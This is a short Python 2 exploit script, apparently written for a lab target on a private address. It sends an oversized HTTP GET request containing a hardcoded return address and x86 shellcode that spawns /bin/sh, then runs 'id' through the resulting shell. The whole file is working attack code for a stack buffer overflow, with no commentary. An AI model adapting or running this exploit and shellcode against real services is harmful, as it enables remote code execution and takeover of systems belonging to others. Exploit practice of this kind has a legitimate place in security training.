#!/usr/bin/env python
import socket

IP = "192.168.122.37"
PORT = 20000
pre_payload = "GET " + "X"*139 + "\x94\xf9\xff\xbf" + " HTTP/1.1"
#path_addr = 0xbffff8f8
#sh_addr = path_addr + len(payload)
#print hex(sh_addr)
shellcode =  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \
"\x80\xe8\xdc\xff\xff\xff/bin/sh"
cmd = "id"

payload = pre_payload + shellcode

s = socket.create_connection((IP, PORT))
print "<<", s.recv(1024),
print ">>", payload
s.send(payload)
print ">>", cmd
s.send(cmd + "\n")
print "<<", s.recv(1024)
